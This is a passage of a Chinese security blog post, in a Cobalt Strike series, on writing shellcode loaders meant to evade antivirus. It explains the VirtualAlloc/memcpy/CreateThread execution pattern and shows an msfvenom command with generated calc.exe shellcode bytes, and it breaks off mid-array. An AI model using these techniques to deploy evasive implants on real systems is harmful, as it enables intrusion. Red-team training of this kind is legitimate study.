@@ -1,0 +1,798 @@
+
+<!DOCTYPE html><html lang="zh-CN">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.27.0" theme-name="Stellar" theme-version="1.27.0">
+  
+  <meta name="generator" content="Hexo 7.1.1">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  
+  <title>CS-ShellCode加载器 - SafeKiller Zone</title>
+
+  
+    <meta name="description" content="总字符数: 39.53K                代码: 32.95K, 文本: 4.01K               预计阅读时间: 2.68 小时            Shellcode什么是ShellcodeShellcode 是一种特殊的二进制代码, 主要目的是在目标系统上执行特定的操作,例如获取系统权限、建立远程访问通道、执行恶意代码等.Shellcode 的名称来源">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CS-ShellCode加载器">
+<meta property="og:url" content="https://jiangjiyue.github.io/2024/11/04/fe2980d6/index.html">
+<meta property="og:site_name" content="SafeKiller Zone">
+<meta property="og:description" content="总字符数: 39.53K                代码: 32.95K, 文本: 4.01K               预计阅读时间: 2.68 小时            Shellcode什么是ShellcodeShellcode 是一种特殊的二进制代码, 主要目的是在目标系统上执行特定的操作,例如获取系统权限、建立远程访问通道、执行恶意代码等.Shellcode 的名称来源">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202411041301262.png">
+<meta property="article:published_time" content="2024-11-04T04:58:49.000Z">
+<meta property="article:modified_time" content="2024-11-04T05:04:26.000Z">
+<meta property="article:author" content="Kill3r">
+<meta property="article:tag" content="Cobalt Strike">
+<meta property="article:tag" content="后渗透">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202411041301262.png">
+  
+  
+  
+  <meta name="keywords" content="Cobalt Strike,后渗透">
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="SafeKiller Zone" type="application/atom+xml">
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.27.0">
+
+  
+    <link rel="shortcut icon" href="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202401260729165.jpg">
+  
+
+  
+
+  <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" /><link rel="stylesheet" href="/css/darkmode.css">
+</head>
+<body>
+
+<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202401260729165.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">SafeKiller Zone</div><div class="sub normal cap">安全学的再好又有什么用</div><div class="sub hover cap" style="opacity:0"> 连自己喜欢的人都留不住</div></a></div></header>
+
+<div class="nav-area">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="导航" href="/sites/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="社交" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a><a class="nav-item" title="更多" href="/tools/" style="color:#d55afa"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M22 12c0 5.523-4.477 10-10 10S2 17.523 2 12S6.477 2 12 2s10 4.477 10 10" opacity=".5"/><path fill="currentColor" d="M12.75 9a.75.75 0 0 0-1.5 0v2.25H9a.75.75 0 0 0 0 1.5h2.25V15a.75.75 0 0 0 1.5 0v-2.25H15a.75.75 0 0 0 0-1.5h-2.25z"/></svg></a></nav>
+</div>
+<div class="widgets">
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">专栏：Cobalt Strike</span></div><div class="widget-body"><a class="item" href="/2024/09/24/3c3f9499/"><span class="title">CS-Cobalt Strike必备知识</span></a><a class="item" href="/2024/09/25/3c3f9499/"><span class="title">CS-Cobalt Strike修改特征</span></a><a class="item" href="/2024/09/26/da146604/"><span class="title">CS-云函数隐匿C2</span></a><a class="item" href="/2024/10/27/77c80f0f/"><span class="title">CS-C语言总结</span></a><a class="item" href="/2024/10/28/ce454855/"><span class="title">CS-开发环境配置及exe处理</span></a><a class="item active" href="/2024/11/04/fe2980d6/"><span class="title">CS-ShellCode加载器</span><svg class="active-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M21 11.098v4.993c0 3.096 0 4.645-.734 5.321c-.35.323-.792.526-1.263.58c-.987.113-2.14-.907-4.445-2.946c-1.02-.901-1.529-1.352-2.118-1.47a2.225 2.225 0 0 0-.88 0c-.59.118-1.099.569-2.118 1.47c-2.305 2.039-3.458 3.059-4.445 2.945a2.238 2.238 0 0 1-1.263-.579C3 20.736 3 19.188 3 16.091v-4.994C3 6.81 3 4.666 4.318 3.333C5.636 2 7.758 2 12 2c4.243 0 6.364 0 7.682 1.332C21 4.665 21 6.81 21 11.098" opacity=".5"/><path fill="currentColor" d="M9 5.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5z"/></svg></a></div></widget>
+
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span><a class="cap-action" id="rss" title="Subscribe" href="/atom.xml"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M5 21q-.825 0-1.412-.587T3 19q0-.825.588-1.412T5 17q.825 0 1.413.588T7 19q0 .825-.587 1.413T5 21m13.5 0q-.65 0-1.088-.475T16.9 19.4q-.275-2.425-1.312-4.537T12.9 11.1q-1.65-1.65-3.762-2.687T4.6 7.1q-.65-.075-1.125-.512T3 5.5q0-.65.45-1.062t1.075-.363q3.075.275 5.763 1.563t4.737 3.337q2.05 2.05 3.338 4.738t1.562 5.762q.05.625-.363 1.075T18.5 21m-6 0q-.625 0-1.075-.437T10.85 19.5q-.225-1.225-.787-2.262T8.65 15.35q-.85-.85-1.888-1.412T4.5 13.15q-.625-.125-1.062-.575T3 11.5q0-.65.45-1.075t1.075-.325q1.825.25 3.413 1.063t2.837 2.062q1.25 1.25 2.063 2.838t1.062 3.412q.1.625-.325 1.075T12.5 21"/></svg></a></div><div class="widget-body fs14"><a class="item title" href="/2024/11/04/fe2980d6/"><span class="title">CS-ShellCode加载器</span></a><a class="item title" href="/2023/03/11/247b757/"><span class="title">VulHub-Fastjson漏洞复现</span></a><a class="item title" href="/2023/04/28/76971e68/"><span class="title">VulHub-Tomcat漏洞复现</span></a><a class="item title" href="/2024/07/05/dd58c5ed/"><span class="title">应急响应之Webshell流量分析</span></a><a class="item title" href="/2024/10/27/77c80f0f/"><span class="title">CS-C语言总结</span></a></div></widget>
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/JiangJiYue/" target="_blank" rel="external nofollow noopener noreferrer"><i class="fa-brands fa-github"></i></a><a class="social" href="javaScript:hud.toast('你在听🎵啦啦啦~');" rel="noopener noreferrer"><i class="fa-solid fa-music"></i></a><a class="social" href="https://space.bilibili.com/238008115" target="_blank" rel="external nofollow noopener noreferrer"><i class="fa-brands fa-bilibili fa-bounce"></i></a><a class="social" href="/atom.xml" rel="noopener noreferrer"><i class="fa-solid fa-rss fa-shake"></i></a><a class="social" href="/comments/" rel="noopener noreferrer"><i class="fa-regular fa-comment-dots"></i></a><a class="social" href="javaScript:void(0);" rel="noopener noreferrer"><i class="fa-solid fa-circle-half-stroke fa-flip"></i></a></div></footer>
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" id="menu" href="/topic">专栏</a><span class="sep"></span><a class="cap breadcrumb" id="proj" href="/2024/09/24/3c3f9499/">Cobalt Strike</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-11-04T04:58:49.000Z">2024-11-04</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-11-04T05:04:26.000Z">2024-11-04</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>CS-ShellCode加载器</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><div class="tag-plugin grid" bg="card" style="grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));"><div class="cell" style="">
+    <p>总字符数: 39.53K </p>
+    </div>
+    <div class="cell" style="">
+    <p>代码: 32.95K, 文本: 4.01K</p>
+    </div>
+    <div class="cell" style="">
+    <p>预计阅读时间: 2.68 小时</p>
+    </div>
+    </div>
+
+<h2 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h2><h3 id="什么是Shellcode"><a href="#什么是Shellcode" class="headerlink" title="什么是Shellcode"></a>什么是Shellcode</h3><p>Shellcode 是一种特殊的二进制代码, 主要目的是在目标系统上执行特定的操作,例如获取系统权限、建立远程访问通道、执行恶意代码等.Shellcode 的名称来源于其最常见的用途之一,即在成功利用后注入代码来获取系统 shell的控制权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exe文件--&gt;硬盘--&gt;把exe内容,读取到内存中--&gt;转成二进制指令--&gt;cpu运行</span><br></pre></td></tr></table></figure>
+
+<p><strong>Shellcode 通常以二进制格式存储,因为它需要直接由计算机的中央处理单元(CPU)执行.</strong><br>这与源代码或文本文件不同,这些文件需要编译或解释成机器码才能执行.</p>
+<p>在一般情况下, Shellcode 可能以十六进制字符串的形式出现 ,但在运行时,这些字符串通常会被解析为二进制数据.要使用 Shellcode,通常需要将它嵌入到合适的载体中或以其他方式将其传递给目标系统,以便执行其中的指令.</p>
+<h3 id="为什么有Shellcode"><a href="#为什么有Shellcode" class="headerlink" title="为什么有Shellcode"></a>为什么有Shellcode</h3><p>如果只是针对免杀而言, Shellcode的出现可以帮助我们进行各种不同方式上线cs, 从而解决了只有exe上线做免杀的那几种受限的方法, 提供更多不同的免杀处理方式</p>
+<h3 id="Shellcode如何运行"><a href="#Shellcode如何运行" class="headerlink" title="Shellcode如何运行"></a>Shellcode如何运行</h3><p>上面我们了解到, 一般情况下我们拿到的 Shellcode, 要么是一个16进制字符串, 要么是一个二进制文件, 他们都是不能单独直接可以运行的文件, 所以我们需要借助加载器实现Shellcode在目标机器中运行</p>
+<h2 id="Shellcode加载器"><a href="#Shellcode加载器" class="headerlink" title="Shellcode加载器"></a>Shellcode加载器</h2><blockquote>
+<p>可以运行以十六进制字符串表示的shellcode的工具</p>
+</blockquote>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202411041301262.png" data-fancybox="true"/></div></div>
+
+<h3 id="加载器的基本流程"><a href="#加载器的基本流程" class="headerlink" title="加载器的基本流程"></a>加载器的基本流程</h3><p>首先Shellcode加载器既然是通过代码编写, 那么在理论上不同编程语言都可以编写.</p>
+<p>整个Shellcode想要执行, 需要加载器做那些事情呢? 由于Shellcode直接由cpu执行, 那么回想一个程序是怎么跑起来的? 首先程序运行产生的数据一定是在内存中, 数据从内存中取出来, 翻译成指令, cpu执行这些指令</p>
+<p>所以我的加载器, 需要实现的功能就是</p>
+<ol>
+<li>开辟内存</li>
+<li>把Shellcode放到这块内存中</li>
+<li>想办法让这块内存中的Shellcode被cpu执行回调函数执行</li>
+</ol>
+<p>既然需要将Shellcode放到内存中那必定离不开Windows底层的东西.Windows专门提供了相关API供我们和系统底层交互</p>
+<h4 id="VirtualAlloc函数"><a href="#VirtualAlloc函数" class="headerlink" title="VirtualAlloc函数"></a>VirtualAlloc函数</h4><p><code>VirtualAlloc</code>是Windows操作系统和中的一个函数,用于在当前进程的虚拟地址空间中分配内存,它是一种用于动态内存分配的重要函数,适用于在运行时分配内存块的情况.</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LPVOID</span></span><br><span class="line"><span class="function"><span class="title">VirtualAlloc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpAddress, <span class="comment">// 指定分配或保留的内存区域的首选基地址.如果此参数为NULL,则会选择适当的地址.如果指定了地址,系统将尝试在指定的基地址上分配内存.注意,此地址必须是页对齐的.</span></span></span></span><br><span class="line"><span class="params"><span class="function">    SIZE_T dwSize,    <span class="comment">// 指定要分配的内存区域大小,以字节为单位</span></span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD flAllocationType,  <span class="comment">// 指定内存的分配类型</span></span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD flProtect     <span class="comment">//flProtect: 指定内存保护属性.</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br></pre></td></tr></table></figure>
+
+<p><code>flAllocationType</code>可能值包括:</p>
+<ol>
+<li><code>MEM_COMMIT (0x1000)</code>物理页面分配给内存中的一个或多个页,并将这些页的内容初始化为零.如果同时指定了 MEM_RESERVE,则系统会保留这些页的地址空间而不将它们分配给任何物理页面.</li>
+<li><code>MEM_RESERVE (0x2000)</code>保留指定地址空间,不分配物理内存.这样可以阻止其他内存分配函数malloc和LocalAlloc等再使用已保留的内存范围,直到它被释放.当使用上面的VirtualAlloc函数保留了一段地址空间后,接下还你还可以继续多次调用同样的函数提交这段地址空间中的不同页面.</li>
+<li><code>MEM_RESET (0x80000)</code>将分配的页面的内容初始化为零.这个标志仅在使用MEM_COMMIT 标志时才有意义.</li>
+</ol>
+<p><code>flProtect</code>可能值包括：</p>
+<ol>
+<li><code>PAGE_EXECUTE (0x10)</code>允许页面被执行.</li>
+<li><code>PAGE_EXECUTE_READ (0x20)</code>允许页面被执行和读取.</li>
+<li><code>PAGE_EXECUTE_READWRITE (0x40)</code>允许页面被执行、读取和写入.可读可写可执行</li>
+<li><code>PAGE_EXECUTE_WRITECOPY (0x80)</code>允许页面被执行和写入.页面内容可以被其他进程写入</li>
+<li><code>PAGE_READONLY (0x02)</code>允许页面被读取</li>
+<li><code>PAGE_READWRITE (0x04)</code>允许页面被读取和写入</li>
+<li><code>PAGE_WRITECOPY (0x08)</code>允许页面被写入.页面内容可以被其他进程写入</li>
+</ol>
+<p><code>VirtualAlloc</code>函数可以用于多种用途,包括分配可执行代码、数据、堆、栈等.通常,在分配可执行代码时,可将<code>flProtect</code>设置为<code>PAGE_EXECUTE_READWRITE</code>或类似的值,以便在分配的内存上执行代码.</p>
+<h4 id="Memcpy函数"><a href="#Memcpy函数" class="headerlink" title="Memcpy函数"></a>Memcpy函数</h4><p>Memcpy是C标准库中的一个函数,用于将内存块中的内容从一个位置复制到另一个位置.</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> *<span class="title">memcpy</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="type">void</span>* _Dst,  		<span class="comment">// 指向目标内存区域的指针,即复制操作的目标位置.</span></span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="type">void</span> <span class="type">const</span>* _Src,   <span class="comment">// 指向源内存区域的指针,即复制操作的源位置.</span></span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="type">size_t</span>      _Size   <span class="comment">// 要复制的字节数.</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>
+
+<p>现在内存相关的操作, 这些函数都可以实现了, 就差怎么执行Shellcode了, 执行Shellcode的方式很多, 后</p>
+<p>面会专门拿出来总结都有哪些, 当下我们使用 创建线程 运行我们的Shellcode, 这就需要 CreateThread </p>
+<h4 id="CreateThread"><a href="#CreateThread" class="headerlink" title="CreateThread"></a>CreateThread</h4><p><code>CreateThread</code>是Windows API中用于创建新线程的函数.</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE</span></span><br><span class="line"><span class="function"><span class="title">CreateThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    LPSECURITY_ATTRIBUTES lpThreadAttributes,  <span class="comment">// 一个指向SECURITY_ATTRIBUTES结构的指针,用于指定新线程的安全性.可以为NULL表示使用默认的线程安全性.</span></span></span></span><br><span class="line"><span class="params"><span class="function">    SIZE_T dwStackSize,           <span class="comment">// 指定新线程的初始堆栈大小.可以为 0,表示使用默认堆栈大小</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPTHREAD_START_ROUTINE lpStartAddress,  <span class="comment">// 指向线程函数的指针,即新线程的入口点.线程函数是一个LPTHREAD_START_ROUTINE类型的函数指针,通常是线程的主要执行体.</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpParameter,         <span class="comment">// 传递给线程函数的参数.这是一个指向任意类型的指针,可以用来传递数据给线程函数.</span></span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD dwCreationFlags,      <span class="comment">// 指定新线程的创建标志</span></span></span></span><br><span class="line"><span class="params"><span class="function">	LPDWORD lpThreadId			<span class="comment">// 一个指向DWORD的指针,用于接收新线程的标识符(线程 ID).如果不需要线程 ID,可以传递NULL</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>
+
+<p><code>dwCreationFlags</code>常见的标志有:</p>
+<ol>
+<li><code>0</code>默认标志,表示线程立即可执行.</li>
+<li><code>CREATE_SUSPENDED (0x00000004)</code>创建后线程处于挂起状态,需要调用<code>ResumeThread</code>才能执行.</li>
+</ol>
+<h3 id="C语言加载器"><a href="#C语言加载器" class="headerlink" title="C语言加载器"></a>C语言加载器</h3><p>windows api函数我们了解了, 但是如何使用这些函数的? 用什么编程语言呢?自然是c语言啦, 在c语言中可以很方便的调用 windows api函数, 帮助我们编写Shellcode加载器</p>
+<h4 id="加载器代码"><a href="#加载器代码" class="headerlink" title="加载器代码"></a>加载器代码</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ msfvenom -p windows/x64/exec CMD=calc.exe -f c &gt;shellcode.c</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No <span class="built_in">arch</span> selected, selecting <span class="built_in">arch</span>: x64 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 276 bytes</span><br><span class="line">Final size of c file: 1188 bytes</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ <span class="built_in">ls</span></span><br><span class="line"><span class="string">&#x27;OSCP Like Machines&#x27;</span>   shellcode.c</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ <span class="built_in">cat</span> shellcode.c </span><br><span class="line">unsigned char buf[] = </span><br><span class="line"><span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x